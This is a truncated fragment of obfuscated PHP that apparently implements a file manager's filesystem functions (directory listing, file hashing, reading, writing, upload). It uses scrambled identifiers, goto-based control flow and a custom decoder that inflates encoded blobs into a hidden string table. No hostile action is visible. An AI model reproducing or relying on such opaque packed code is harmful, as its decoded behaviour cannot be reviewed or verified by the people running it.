@filemtime($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[1174] => @fileatime($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[77] => $this->size($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[165] => $this->ext($eŞºÊ”§†Ç), $c¾ñ«‚ù¥[1169] => is_readable($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[1170] => is_writable($Cè·‡ƒğÊ¼), $c¾ñ«‚ù¥[1175] => get_mode($Cè·‡ƒğÊ¼)); return $dïÄÌå¼Õó; } public function exist($CÁ¥º°—³ß) { $CÁ¥º°—³ß = $this->iconvSystem($CÁ¥º°—³ß); return @file_exists($CÁ¥º°—³ß); } public function isFile($E¥½š¬’àÊ) { $E¥½š¬’àÊ = $this->iconvSystem($E¥½š¬’àÊ); return @is_file($E¥½š¬’àÊ); } public function isFolder($eì§Ş¸¿óÎ) { $eì§Ş¸¿óÎ = $this->iconvSystem($eì§Ş¸¿óÎ); return @is_dir($eì§Ş¸¿óÎ); } public function listPath($fŒª†¢Ï²›, $C’ãºª·Üğ = false) { goto e”´½ƒ÷¸’; E¡œ¬•ÀÏ: closedir($D®ô”«“ë×); return $b…â‡Ôò¤‹; goto aÑğ‡ŠÜìì; C¶Ë˜÷‹­¤: $b…â‡Ôò¤‹ = array($B¿ù§ÂËÚ‰[74] => array(), $B¿ù§ÂËÚ‰[73] => array()); if (!($D®ô”«“ë× = @opendir($fŒª†¢Ï²›))) { return $b…â‡Ôò¤‹; } while (($c¸‹¡³ªãÙ = readdir($D®ô”«“ë×)) !== !1) { if ($c¸‹¡³ªãÙ == $B¿ù§ÂËÚ‰[91] || $c¸‹¡³ªãÙ == $B¿ù§ÂËÚ‰[1172]) { continue; } $BÏ¥º„¸¹— = $fŒª†¢Ï²› . $c¸‹¡³ªãÙ; if (is_file($BÏ¥º„¸¹—)) { $b…â‡Ôò¤‹[$B¿ù§ÂËÚ‰[73]][] = $this->fileInfo($BÏ¥º„¸¹—, $C’ãºª·Üğ); } else { $b…â‡Ôò¤‹[$B¿ù§ÂËÚ‰[74]][] = $this->folderInfo($BÏ¥º„¸¹—, $C’ãºª·Üğ); } } goto E¡œ¬•ÀÏ; e”´½ƒ÷¸’: $B¿ù§ÂËÚ‰ =& $_SERVER[‡’¶øåüç˜]; $fŒª†¢Ï²› = $this->iconvSystem($fŒª†¢Ï²›); $fŒª†¢Ï²› = rtrim($fŒª†¢Ï²›, $B¿ù§ÂËÚ‰[8]) . $B¿ù§ÂËÚ‰[8]; goto C¶Ë˜÷‹­¤; aÑğ‡ŠÜìì: } public function listAll($A¡×Êñ¤ö¾, &$EÏè¤±¬ô = array()) { goto BĞ¥îµ‰Æ; fÈß“ÜğÕ: return $EÏè¤±¬ô; goto CĞÕ¯ïÕÔ; CÚ”ÉÉİÎ©: if (!($BÄÖÉÈ³¸ = @opendir($A¡×Êñ¤ö¾))) { return $EÏè¤±¬ô; } while (($eİÙìÀ«‰„ = readdir($BÄÖÉÈ³¸)) !== !1) { if ($eİÙìÀ«‰„ == $fŠÑŞ³ ĞÎ[91] || $eİÙìÀ«‰„ == $fŠÑŞ³ ĞÎ[1172]) { continue; } $E±ô¾ï˜Äê = $A¡×Êñ¤ö¾ . $eİÙìÀ«‰„; if (is_dir($E±ô¾ï˜Äê) && !is_link($E±ô¾ï˜Äê)) { $EÏè¤±¬ô[] = array($fŠÑŞ³ ĞÎ[75] => $E±ô¾ï˜Äê . $fŠÑŞ³ ĞÎ[8], $fŠÑŞ³ ĞÎ[76] => 1, $fŠÑŞ³ ĞÎ[107] => @filemtime($E±ô¾ï˜Äê), $fŠÑŞ³ ĞÎ[77] => 0); $this->listAll($E±ô¾ï˜Äê, $EÏè¤±¬ô); } else { $EÏè¤±¬ô[] = array($fŠÑŞ³ ĞÎ[75] => $E±ô¾ï˜Äê, $fŠÑŞ³ ĞÎ[76] => 0, $fŠÑŞ³ ĞÎ[107] => @filemtime($E±ô¾ï˜Äê), $fŠÑŞ³ ĞÎ[77] => $this->size($E±ô¾ï˜Äê)); } } closedir($BÄÖÉÈ³¸); goto fÈß“ÜğÕ; BĞ¥îµ‰Æ: $fŠÑŞ³ ĞÎ =& $_SERVER[‡’¶øåüç˜]; $A¡×Êñ¤ö¾ = $this->iconvSystem($A¡×Êñ¤ö¾); $A¡×Êñ¤ö¾ = rtrim($A¡×Êñ¤ö¾, $fŠÑŞ³ ĞÎ[8]) . $fŠÑŞ³ ĞÎ[8]; goto CÚ”ÉÉİÎ©; CĞÕ¯ïÕÔ: } public function has($E¾ÄÎôø, $E©°„°² = false, $EÚÁó“í¬ = true) { goto aì÷ãÓ±ãê; a„ÉˆÂœ—‰: if (!($EŞ¦Ü§ÎÈà = @opendir($E¾ÄÎôø))) { return !1; } $Dƒ·Ğ£öª = 0; $BŒ¬æİë² = 0; goto Eà—Ñğòµ; E‚ƒÃÚ“Ó¹: if ($E©°„°²) { return array($Dï¶Úâ¦[195] => $Dƒ·Ğ£öª, $Dï¶Úâ¦[196] => $BŒ¬æİë²); } return !1; goto D´¸¹àˆÇÙ; Eà—Ñğòµ: $D¢±ÁÍíñ« = 0; while (($bÃßã½Õ• = readdir($EŞ¦Ü§ÎÈà)) !== !1) { if ($bÃßã½Õ• == $Dï¶Úâ¦[91] || $bÃßã½Õ• == $Dï¶Úâ¦[1172]) { continue; } $BíÜ®î‡ÓÂ = $E¾ÄÎôø . $bÃßã½Õ•; if ($E©°„°²) { $D¢±ÁÍíñ«++; if (@is_file($BíÜ®î‡ÓÂ)) { $Dƒ·Ğ£öª++; } else { $BŒ¬æİë²++; } if ($D¢±ÁÍíñ« > 10000) { break; } continue; } if ($EÚÁó“í¬) { if (@is_file($BíÜ®î‡ÓÂ)) { return !0; } } else { if (@is_dir($BíÜ®î‡ÓÂ . $Dï¶Úâ¦[8])) { return !0; } } } closedir($EŞ¦Ü§ÎÈà); goto E‚ƒÃÚ“Ó¹; aì÷ãÓ±ãê: $Dï¶Úâ¦ =& $_SERVER[‡’¶øåüç˜]; $E¾ÄÎôø = $this->iconvSystem($E¾ÄÎôø); $E¾ÄÎôø = rtrim($E¾ÄÎôø, $Dï¶Úâ¦[8]) . $Dï¶Úâ¦[8]; goto a„ÉˆÂœ—‰; D´¸¹àˆÇÙ: } public function hashSimple($D¼·çÛŒ–ö) { goto aóøÈ¯¸¥º; aóøÈ¯¸¥º: $CíŠÇßÕÑò =& $_SERVER[‡’¶øåüç˜]; if (!$D¼·çÛŒ–ö) { return md5($CíŠÇßÕÑò[33]); } $D¼·çÛŒ–ö = $this->iconvSystem($D¼·çÛŒ–ö); goto F¥–Å‰‚ ; F¥–Å‰‚ : $EÂ£ÓÈëœ = $this->size($D¼·çÛŒ–ö); $cŞ×è˜ó­´ = 200; $e³‘¥¯è„ = 50; goto eÙ×ªàæß; d›Ê¹Ëç½¶: $d‚Á‚…ŸÎ• = fopen($D¼·çÛŒ–ö, $CíŠÇßÕÑò[1176]); if (!$d‚Á‚…ŸÎ•) { return $B´ŠË‰Ïô; } for ($A”ÑÄ·ö¸ = 0; $A”ÑÄ·ö¸ < $e³‘¥¯è„; $A”ÑÄ·ö¸++) { fseek_64($d‚Á‚…ŸÎ•, $E…Ö¸¯‰æ› * $A”ÑÄ·ö¸); $B´ŠË‰Ïô .= fread($d‚Á‚…ŸÎ•, $cŞ×è˜ó­´); } goto b›ğÀÚ¨Úè; b›ğÀÚ¨Úè: fseek_64($d‚Á‚…ŸÎ•, $EÂ£ÓÈëœ - $cŞ×è˜ó­´); $B´ŠË‰Ïô .= fread($d‚Á‚…ŸÎ•, $cŞ×è˜ó­´); fclose($d‚Á‚…ŸÎ•); goto b‹Ş·¨ß„²; b‹Ş·¨ß„²: return md5($B´ŠË‰Ïô) . $EÂ£ÓÈëœ; goto b˜áí‹ÉÙ©; eÙ×ªàæß: if ($EÂ£ÓÈëœ <= $cŞ×è˜ó­´ * $e³‘¥¯è„) { return $this->hashMd5($D¼·çÛŒ–ö) . $EÂ£ÓÈëœ; } $B´ŠË‰Ïô = $CíŠÇßÕÑò[33]; $E…Ö¸¯‰æ› = intval($EÂ£ÓÈëœ / $e³‘¥¯è„); goto d›Ê¹Ëç½¶; b˜áí‹ÉÙ©: } public function getContent($EªÒ¡ºáë„) { $EªÒ¡ºáë„ = $this->iconvSystem($EªÒ¡ºáë„); return file_get_contents($EªÒ¡ºáë„); } public function setContent($fçä‹åñ™, $b’ãÚîÔƒ— = '') { $fçä‹åñ™ = $this->iconvSystem($fçä‹åñ™); @file_put_contents($fçä‹åñ™, $b’ãÚîÔƒ—, LOCK_EX); clearstatcache(); return strlen($b’ãÚîÔƒ—) == filesize_64($fçä‹åñ™); } public function fileSubstr($D¢å¸Ìïâİ, $fç»¯Ÿ–‹½ = 0, $aæùÇÄŞ„ = false) { goto Cô±º‰êÑš; a‘Œ©Ö…Ä: fseek_64($d§ÏÚ¯Œ«Ö, $fç»¯Ÿ–‹½); $aÆË’ùêœ² = fread($d§ÏÚ¯Œ«Ö, $aæùÇÄŞ„); fclose($d§ÏÚ¯Œ«Ö); goto dÈ•¨ËŒˆŒ; Bƒƒ‚¯İø: if ($aæùÇÄŞ„ <= 0) { return $A¥†–¡©¿ß[33]; } $d§ÏÚ¯Œ«Ö = fopen($D¢å¸Ìïâİ, $A¥†–¡©¿ß[1176]); if (!$d§ÏÚ¯Œ«Ö) { return !1; } goto a‘Œ©Ö…Ä; dÈ•¨ËŒˆŒ: return $aÆË’ùêœ²; goto cÒ‘»˜¬Ÿº; Cô±º‰êÑš: $A¥†–¡©¿ß =& $_SERVER[‡’¶øåüç˜]; $D¢å¸Ìïâİ = $this->iconvSystem($D¢å¸Ìïâİ); if ($aæùÇÄŞ„ === !1) { $aæùÇÄŞ„ = $this->size($D¢å¸Ìïâİ); } goto Bƒƒ‚¯İø; cÒ‘»˜¬Ÿº: } public function upload($BÄé¡…¸÷, $AÃÆÍ…íŒ, $cõ‚Ú¶ÙùÓ = false, $F—…îŞÄ‡À = REPEAT_REPLACE) { $F˜áäÑ×ï© = $this->copyFile($AÃÆÍ…íŒ, $BÄé¡…¸÷); return $F˜áäÑ×ï© ? $this->getPathOuter($BÄé¡…¸÷) : !1; } public function setModifyTime($d×¥åæÉê•, $D¤¶íŞ¤áÃ = '') { @touch($d×¥åæÉê•, intval($D¤¶íŞ¤áÃ)); } public function download($aò°˜†Ù»Ê, $AÄŒîÀ²ŒŒ) { return $this->iconvSystem($aò°˜†Ù»Ê); } } goto Dƒ³÷³¹‚; fÏ¢‡É“ğÏ: if (!function_exists('_kodDe')) { function _kodDe($eº”Ì²¼˜®) { $eº”Ì²¼˜® = base64_decode($eº”Ì²¼˜®); $eÏ‡è‘İ¿Ì = strlen($eº”Ì²¼˜®); $aÆÄ¹¤äÌ° = ''; $E¶˜ÎİÔ‹‰ = ord($eº”Ì²¼˜®[0]) - 30; for ($bÉé»ˆƒ÷¡ = 1; $bÉé»ˆƒ÷¡ < $eÏ‡è‘İ¿Ì; $bÉé»ˆƒ÷¡ += 2) { if ($bÉé»ˆƒ÷¡ + 1 < $eÏ‡è‘İ¿Ì) { $aÆÄ¹¤äÌ° .= chr(ord($eº”Ì²¼˜®[$bÉé»ˆƒ÷¡ + 1]) + $E¶˜ÎİÔ‹‰); $aÆÄ¹¤äÌ° .= chr(ord($eº”Ì²¼˜®[$bÉé»ˆƒ÷¡]) + $E¶˜ÎİÔ‹‰); } else { $aÆÄ¹¤äÌ° .= chr(ord($eº”Ì²¼˜®[$bÉé»ˆƒ÷¡]) + $E¶˜ÎİÔ‹‰); } } return $aÆÄ¹¤äÌ°; } } define("\x87\x92\xb6\xf8\xe5\xfc\xe7\x98", "\xa4\xd1\xd2\x9b"); $_SERVER[‡’¶øåüç˜] = explode("\x7c\x4\x7c\x4\x7c\x1", gzinflate(substr(_kodDe('L3oO7/fv7+/v8u9sjE/4tAofxChWSjphyVpzAWAqUVspYLYWARFloTqznAulfThHgkg1GjhSWJo4nds=')."\344\43\11\5\232\162\37\245\334\127\51\1\122\302\221\160\37\241\34\241\345\56\51\224\102\371\270\257\44\134\201\102\71\2\341\370\347\236\331\225\114\333\237\326\321\314\233\67\263\63\157\336\274\171\63\363\346\315"."\xd7\x5b\x56\xed\x5\xfe\xb7\xfb\xce\x73\xaf\xd8\xb8\xe3\x85\xd7\x2f\xc6\xb1\x55\x7b\x80\xff\xed\x89\xc3\xc7\x9c\xb9\xef\x6e\xe8\xbf\x3d\x73\xb\x7\x83\xf\xd7\xfd\xa2\xfb\xb3\xa7\x63\x9b\xcf\xf\xfe\xe8\xe0\xd7\x4f\xdf\xdd\x73\xe9"."\xc2\xf6\x57\xde\x7a\xe8\xe2\x75\x77\xc\xdf\x74\xf5\x67\x4d\xb9\x43\x4f\xff\xe4\xb1\xd9\xf7\xfe\xa6\xbb\xed\xa2\xcf\xae\xb8\xfc\x55\x63\xee\x16\x65\x6e\xff\xd3\xc3\xdf\x9e\x72\x70\xe3\xc2\x93\xd6\x45\x8e\x78\xeb\x77\xfb\x3c\xb0\xed"."\350\352\11\77\375\154\277\233\66\314\170\362\247\61\163\346\335\167\151\123\27\154\336\160\363\312\77\74\166\160\233\361\361\313\167\254\113\27\256\237\176\317\346\357\27\245\107\337\70\262\171\355\147\257\35\174\340\176"."\xcb\x7f\xb2\x61\xe3\x59\x6b\x56\x7f\xf3\xd4\x6f\x76\xfb\xd8\x78\xe5\xe4\xd3\x6b\x1e\xd8\xe3\xe6\xc3\x3f\xf4\xf4\xbe\x32\x71\xe6\x69\xdf\x7d\xfd\x97\x7b\xf6\x3f\xf6\xae\x3\x97\xef\xb3\xf8\xd4\x7b\xf6\x5c\xb3\xff\xe4\x4f\xb6\xab\x27"."\254\133\75\323\65\361\352\73\317\135\334\264\340\200\57\176\167\235\321\24\64\232\6\217\133\170\337\51\7\37\225\354\73\152\322\11\376\75\37\273\306\61\232\74\163\141\353\65\73\247\37\176\173\340\323\236\315\341"."\160\350\313\165\67\377\144\357\341\366\113\107\66\72\146\116\176\353\46\343\300\371\177\361\34\267\354\250\175\217\226\266\234\320\121\360\76\64\262\276\361\212\15\63\336\50\316\73\73\172\327\3\277\162\335\374\313\57".strrev('ülVËÍğkÿTw_ş¿İ¸M\'S¹5ÅåĞz·Bú{Î{ÆøÿûÇñ8o«“úİ3£¹î×¯çıÊ7¡ıù')._kodDe('MmeKvVzzmaYoWrNNpyLeC8+bFX6Fjh6SBu1tGfU+iyS/0pib3esHFwSWnsyVmFwEE3F1ZufpZzSNgHg=')."\50\246\347\264\44\11\25\144\135\316\221\302\13\212\156\200\117\211\305\305\12\132\101\311\133\40\34\220\224\115\71\56\33\244\44\137\133\314\347\357\355\12\56\211\105\226\364\372\11\106\74\266\242\250\350\243\70\206".base64_decode('gmFT1s2ImlMYxrDO6tXm7wj0SJGQpyfs8UYCwR4M9ga7uwORcngo2NXV5vEuKE/pDXk6uj0SqF9WiQ==')."\251\371\224\126\55\55\303\51\313\244\32\34\150\127\225\154\22\7\363\62\255\216\71\132\40\241\10\13\201\76\310\27\263\131\34\351\141\41\122\177\45\45\27\263\204\146\76\61\122\320\325\234\114\233\276\100\31\145".base64_decode('UByQi6am5hM44h8xdZnDQY0TupJT8qSosL/L741IsJpSeyjYLZGuyMmGqehSf6c/5Jdg1VumoBZPkQ==')."\160\276\276\36\100\20\311\323\325\45\215\127\202\251\344\12\264\30\234\247\102\141\301\220\317\37\222\332\226\110\234\116\11\55\227\323\362\56\120\12\350\117\123\250\252\77\24\302\1\7\341\340\256\0\354\72\22\11"."\xb6\xb7\x87\xfd\x2c\x46\x1a\xb7\xb0\xb\xd4\x64\x1a\xe1\x52\x4b\x2c\x99\xca\x9a\xb1\x92\x9c\x2d\x52\x66\x1d\xc2\xbf\x53\xc8\xf\xf9\xd5\xc\xc2\xc0\x2b\xd4\xbc\x5a\x24\xcc\x4a\x8a\xd0\x34\x36\x72\x48\xa0\x48\xb1\x15\xa\xc9\x81\x6c".base64_decode('GhlTYICVcLClFf/OJkjxGExTdDOm5BNaUs2TYTiXDDnCeLKZ8ekqwCMFaq6EVhjt1kqkDSk1q3SxUQ==').base64_decode('ltKySUXn8QLILqaQxqhjQu6eYk5EYdFERs0mdTo4fwiznhSrmCZohkFr2lfIanIyrOhC7dtBMcGiKQ==')."\x2\x8b\x8\xad\x5d\xd3\x73\x3e\x20\x0\x8\x75\x0\xdb\xab\x7d\x15\x12\x86\x28\xe3\x27\x5\xa2\xb8\xf0\x8f\xbb\x7a\xe0\x24\xe7\x77\x83\x3\xf3\xc0\x3f\x35\x44\x8a\x45\x49\xd5\x32\x4a\x36\x1b\x53\x46\x14\x32\x40\x72\xc9\xe9\x6\xad"."\xbd\xdb\x88\xab\x79\x37\x80\xe0\x68\x20\x18\xcb\xc8\x46\xa6\x3b\x39\x3d\x86\x72\x91\x9a\xe7\x93\xca\x88\xab\x90\x29\xe0\x28\x1f\xc0\x51\xb\x3\x43\x7a\xf7\x68\xa6\x5f\x10\xb1\x59\x2d\x21\x67\xc5\x96\xe2\x70\xc6\x34\xb\x61\x25\x9f"."\204\4\41\55\322\206\363\210\140\5\105\41\110\76\207\224\224\272\245\45\122\147\263\332\114\271\13\360\112\152\224\113\274\214\231\313\262\20\155\55\203\31\14\150\216\20\236\250\42\161\145\304\44\104\222\146\47\62"."\262\16\272\257\245\150\246\234\63\61\120\56\24\262\152\102\66\125\55\357\326\22\246\142\72\15\123\127\144\122\132\325\154\11\162\4\34\301\265\70\27\35\75\136\55\157\202\341\353\214\350\162\336\110\51\272\323\117"."\330\273\131\2\164\146\22\214\242\371\124\243\240\31\52\374\114\263\44\233\246\234\310\300\321\317\213\157\371\1\174\65\237\125\363\112\31\256\47\221\120\14\303\11\263\350\132\326\351\311\146\265\141\147\120\127\323\52"."\xc8\x53\x6b\xab\x26\x90\x4c\xcd\x44\x74\xf8\x47\xa\xaa\xae\x18\x34\x2a\x75\x74\x47\x8\x32\xa8\x95\xe2\xec\xd5\xe5\x74\x4e\x6e\x96\xa\xc5\x38\xa0\xc\x19\x9f\x15\x60\x18\x9b\x7c\xbd\x59\x4a\xc0\xa8\x43\xca\x15\xd\xd3\xa9\x2b\x40".base64_decode('/KhgoiOdF0g5u2F/qkrSGQZSmoCn1TVKgI0kmoahnZFIbyzQDibjHn+s2xPxdpJqm3Ka1rkLyF5WJA==')."\5\56\166\202\41\7\31\255\7\320\210\3\173\265\141\105\7\37\156\33\155\226\206\264\144\134\33\161\321\44\210\34\6\122\202\42\103\212\26\114\147\110\316\247\41\175\342\243\246\102\330\321\50\245\255\4\355\122"."\362\151\63\103\63\206\375\241\105\376\120\54\34\154\217\364\173\102\144\32\317\203\216\30\241\237\202\105\147\235\41\45\11\110\237\60\151\76\271\0\251\106\161\340\100\201\175\114\123\341\340\241\151\135\201\16\110\30"."\237\323\0\110\116\21\213\226\335\245\346\124\130\167\223\245\40\112\202\71\276\203\124\310\215\32\324\22\315\324\126\107\223\123\153\234\340\337\332\232\201\250\317\125\73\70\327\255\362\74\356\172\127\275\324\120\327\44"."\xf5\x2\xa5\x43\x95\xb3\x12\x69\x74\x19\x46\x9d\x14\x5c\xf0\x3\x4\x80\x73\x92\x30\xcc\x6d\xa4\xc3\xc0\x90\x7f\x61\x9f\x3f\x1c\x89\x75\xfb\x23\x9d\x41\x1f\xf9\x82\xdf\x43\x42\x5d\x1a\x1e\x9a\xb4\x45\x3\xf8\x67\x90\xf4\x60\xa\x8b".strrev('V< ôŠjÒY*‰”j”,åÓVZÒÂ§ÚC:j*vŒS¤š¿Bób¬…bºkuŒ(p® +NN@Ù')."\163\5\52\347\314\114\61\27\27\202\156\136\25\362\135\320\363\114\272\151\154\52\323\164\22\152\166\223\54\223\33\332\311\60\12\272\303\323\300\377\271\200\116\152\71\231\52\264\150\374\53\111\54\0\60\250\326\222"."\322\251\310\174\156\64\165\123\203\120\335\202\322\255\230\31\215\164\127\132\241\125\52\262\272\321\132\46\225\254\102\351\222\121\250\260\7\132\132\211\221\253\240\53\51\225\260\77\120\313\0\234\13\163\325\10\201\114"."\x50\x4d\xa2\xf1\x7e\xa8\xcd\x72\x80\xc9\xe5\xbe\x6c\xf0\xb9\x3\x46\x84\x9\xbe\xbd\xaf\xab\x2b\xe6\xd\xf6\x44\x80\x46\x8b\x21\xfd\xa1\x40\xc4\x4f\x19\xcb\xe3\x8b\x79\xbc\xbd\xab\xe8\x4c\xc8\xbb\x89\x20\xc0\x51\x6e\xe5\x4c\xae\xbd"."\x96\x1a\x56\xf1\xe9\x83\xcf\x33\x5c\x72\x93\x8a\x23\xc9\x8c\xc3\x40\xa4\x16\xb4\xbc\xa1\x38\x13\xa4\xb4\x24\x97\xe1\x18\x63\xb6\x4d\x80\x97\xe5\xe0\x7a\xf4\x88\x53\xce\x8d\x39\x73\x8a\x29\x3b\x59\xd5\xad\xd3\xa4\x44\x84\x36\x9e\x6d"."\3\244\13\270\314\315\202\271\31\54\123\350\374\334\33\14\223\14\163\41\24\50\65\161\105\47\365\350\355\43\111\71\241\373\73\374\4\270\77\341\230\214\114\24\40\117\177\230\312\313\42\300\327\325\61\231\267\161".base64_decode('Lq0PKXskl+V6Wky19F9Miy8HwhAwnVyp1U7eV5HOQM+CWHfQ5++KBXqAsImUw/t6fR7a+SK8LRjptA==').base64_decode('QPuAuFnk6QrY0f2LA+FIuGISgPX5bSlg5dYb8rcHFrNoe8Df5QvHvB5vJ8fp8XSTSCwF106G24ofAw==')."\x72\x33\xcc\x56\x60\xb1\x12\x5c\x4d\x52\x62\xc6\x2c\xcb\x9d\x18\x55\xe4\x63\x9c\x4f\xc0\x1c\xa8\x10\xde\x24\xcd\x85\x6b\x58\xd4\x12\xa2\x5a\x27\xb4\x22\xe5\x56\xa6\xb\xe6\xa8\x80\xc8\xc9\x64\x84\xca\x74\x7e\xab\xc6\x3f\x35\x92\x27".base64_decode('LJkFUgYQBfFRFkTNoHGg9ZHvS0SGl9UgBnHalBQTx5UBnpTJGMMWB+OGp4Ee8KDFMuAE1CMxOhYNsA==')."\xcc\xf0\xd0\xea\xa4\xf8\x42\x35\x16\x4\x2b\x7a\xf\x5c\xe6\xc6\xfa\x43\xc1\x9e\xe\x92\x61\x38\xa3\xd0\xa\x4\x8\xf9\xab\xa9\x4e\x44\x56\xbb\x26\x17\x49\x40\xa1\x91\xb9\x6e\x4a\x89\xbe\x5c\xa3\xa4\x5c\x85\x7f\x8e\xc3\x3f\x40\x7".strrev(',åşÁ"™àù*iÂ¡&Pn^N¶ÊŠ¾´ád/‘¦¸µöEj¨T- à™˜(qê”òW$')."\23\270\21\3\300\312\63\30\42\4\61\265\41\272\16\302\211\41\177\230\112\1\135\131\121\124\51\271\334\256\251\204\213\25\60\377\220\317\273\217\217\16\117\255\36\160\116\165\15\202\100\115\355\74\34\45\261\250".strrev(';ÓğAÄîq'."\0".'†®4pl®*f«¨Ôàç,ç:±ÎÉqà<Û®ê;¨æšÜÆÕ;j–uòDË').strrev(')«M•ĞàZ˜ÂhH‘ä¡ˆ-*ƒV§&ª²ŒKÆ°uIß¥ÌÖÖŒMu§šSƒ¢óe„î<ê9')."\34\364\241\222\346\71\6\234\321\251\203\163\205\174\2\310\376\55\240\1\1\371\234\141\170\36\347\122\330\62\226\25\216\173\302\37\305\174\202\113\127\70\56\342\162\202\310\1\65\235\147\103\10\114\350\154\155\155".strrev(']WÀ¾G®‘eˆI WAÌÜ'."\0".'=”+b¸ïå&h	ey; ®¯1gp1mÃ-:¦Gi«¿ÆNW¾U')."\xa\x5a\x82\x90\x56\x14\x62\x50\xd1\x1a\x66\xb1\xa4\x92\x27\xfd\xb4\x1f\xc1\x36\x12\x72\x41\x9\xb\x2d\x8c\xc5\x22\x9e\xb6\x2e\x7f\x8c\x4a\x18\x22\x89\x69\x1c\x49\xc5\x36\xb6\xc7\x6\x9a\xc6\x25\x2a\x95\xf\x9\xae\x79\x1b\x2b\xb2".base64_decode('EhIGkqLrmt6M9g+NYgHqYmDxZQJ6SmBFLrW0SpjMRErERKIXZKpNwEUy0xDc1dFocUBJDg4ARpadqQ==').base64_decode('wZXTVtdQZdsdBf/RCJZfpMYF3n8G0LUSBO6psM0VYxIQVoHtVmg6m2cLFvXY1Ew5y9BgWgRCSH+xuQ==').base64_decode('miz1cQd2cSEEZ2dhExBJyB62w8U2LoT9JwBzCFH8bwtZn6fUPBgIXj5JBXxO0omexc6AD4dZQKUiXQ==').base64_decode('TpG1WyAvQmihWSUGZqoYUayI3G7zhAPeWK+H6gNg7e+GIw0qLFynbiTtzyiJoZgcBzxAFzBFqO0NUQ==')."\272\1\171\142\322\152\31\132\121\117\50\254\222\26\55\307\224\165\120\25\256\132\302\312\11\333\244\200\164\16\270\237\342\200\223\272\3\250\233\16\270\40\161\160\225\331\301\267\102\34\114\1\166\20\275\330\301\113"."\x27\xc1\x80\xcf\xa1\x1a\x3e\xa4\x9f\xa3\x72\x51\x12\xad\xb3\x99\x81\x1b\xb\x59\x79\xd4\x81\xeb\xdf\xa5\x94\x94\xac\x83\xd6\xde\x41\x1b\xe5\xa0\x2d\x70\xa0\x95\x93\x8f\xd4\xa6\xf\x30\x28\xa9\xd\xa\x2\xda\x65\x1c\x90\x1f\x20\x73".base64_decode('0VJgkJKBafUOrvE70rpWLPTSLwkxXBkC4DVlgJCmmQ66lHOUr/JgdXhoEec4XnvCwqwJOG6vA4bC9A==')."\166\271\44\166\160\305\316\316\133\71\223\357\366\362\135\111\256\257\331\127\102\366\155\56\116\104\136\211\210\234\16\13\237\67\345\64\375\166\205\124\34\16\51\211\321\4\137\135\371\204\345\232\65\306\272\36\361\141".strrev('ê'."\n".'„‘›pË(ƒex2Eq  ¡Ì‚„0¤J)ğ,ÛÍÜ¸Û0²v0×)³”~ß¿í¯AŒõÜªf%').strrev('·²™Ë¡1WC€óqyªÍW½ÒÒm¡m-X×L1j£òQy8ï`4š$`”M¤ÈùF)o[O')."\155\273\303\67\136\30\313\26\276\71\341\40\233\26\16\50\312\4\261\313\27\331\240\366\110\176\362\272\223\222\154\65\247\3\220\64\272\17\254\312\142\66\306\44\54\231\221\165\116\123\72\242\40\33\363\55\31\210".strrev('v VOMüCXh4·'."\n".'1VˆÒÔa¬›F©ˆqQJÍ‹déõPµ „UvÊ9†G’ÅÙñ.JZ£Â')."\42\1\275\204\356\372\321\145\106\314\266\335\1\242\102\207\305\54\73\43\270\176\36\46\1\201\202\225\5\202\121\167\301\261\322\1\345\33\45\32\36\326\264\212\120\246\342\260\200\124\260\213\102\213\310\26\161\150".base64_decode('zC60bVBblH/UIn74kLKUQrfB6gjzJ8Hq1aVjAecCahA5unLUCbMcH8UrjVHDVHJEIK62UccEy6y4rA==').base64_decode('u3RQI15RPjMQJajIAIN2DFx8l0Z1cjgq/EnVhBAo1DS6ecYRBWnPYEKBiCSusj7IqkMkl2OyBbOSQA==')."\167\325\42\31\354\342\123\220\70\201\211\207\144\20\215\267\34\36\272\341\220\160\274\234\143\247\160\10\350\62\114\255\300\123\204\50\116\26\222\170\241\2\26\43\76\252\41\230\10\222\110\115\340\44\104\270\44\57".base64_decode('0uQxc7uyAEPY+A34PLpOmQQ3D+4kAaAIguM4THcyKwlmXLi/xI+NcVHwwy48T7nkZDJIt/nEcDmquA==')."\xab\x51\xb9\x20\x74\x92\xcf\x8a\x12\x62\x95\xd1\x3d\xd9\x2c\x3f\x16\xb4\xc7\xc7\xcd\x82\xc7\xaa\x98\x49\x84\x8c\x9b\xad\x1d\x29\xe3\x54\xdd\xad\x4\x63\xaa\x5d\xbb\x8d\x87\xf8\x88\xe3\xc7\xae\x76\xcd\xd7\x2a\x7c\xfe\x93\x56\x56\x36".base64_decode('AniHVo5D+ZhR84rBJijdqNBiyJnjdRNME/adwDILAETZzzZXuEgQpjc0VcRMy8QcQmUIrGqhPhgamA==')."\222\355\272\226\13\4\1\353\127\346\7\73\236\102\267\227\220\274\31\121\53\65\24\364\37\234\40\306\53\223\46\263\242\370\154\362\360\213\177\376\367\372\333\357\271\372\236\265\70\176\21\376\151\154\44\62\30\31"."\x35\xfd\x8\x87\xb9\x49\xd3\xea\xc5\x3\xda\xdb\x8f\xfe\xb2\x7d\xd7\x33\xaf\xdf\x1a\x68\x7a\xf4\xd1\xb3\xef\xfc\xc7\xe0\xf2\x4d\x8f\x3c\xb9\xe9\xc5\x4f\x9f\xbc\xc8\xf9\xc4\x17\xa9\xe7\x1c\xf5\x93\x4e\xad\x72\xfe\xce\x7b\x9e\x77\xf0"."\x95\x3f\xed\x95\x3b\xff\x69\xef\x19\xbf\xe8\x3e\x69\x5d\xe6\xd9\x1f\x39\x9f\xd9\x23\x77\xdb\xee\x4b\x27\x65\x4e\xfe\xee\xf2\xb1\x1d\xdf\x9c\x79\xd0\xac\xf4\x29\xd7\xe\x1f\xf5\xd0\x2d\xa9\x2d\xd1\x2d\xdf\x5e\xa1\x9d\xd6\xff\x80\xf7"."\xc0\x6f\xb6\x7c\xf9\xda\x57\xdf\xcd\x9e\x5b\xfd\xaf\x63\x26\xbc\xe8\x3a\x66\x74\xaa\xef\xcc\xe9\xf7\x9f\x74\xd6\xda\x2d\x35\xe1\x53\x33\x8f\x1f\xfe\xe6\xe8\x1a\xef\xd2\x67\x6e\x9\xec\x31\xf3\xc3\x53\xce\x39\xf5\x97\x7b\x1e\x7a\xe3"."\330\171\341\266\11\275\157\375\166\362\101\73\217\374\352\273\352\117\167\276\70\274\166\375\225\107\74\65\371\273\357\353\156\177\363\254\323\316\73\347\310\216\263\333\216\274\76\365\316\111\235\367\255\371\353\265\157\74"."\xb7\xfe\x8d\x8b\x7e\xbe\xe1\xba\xf0\xe5\x23\xb9\xd2\x84\x43\x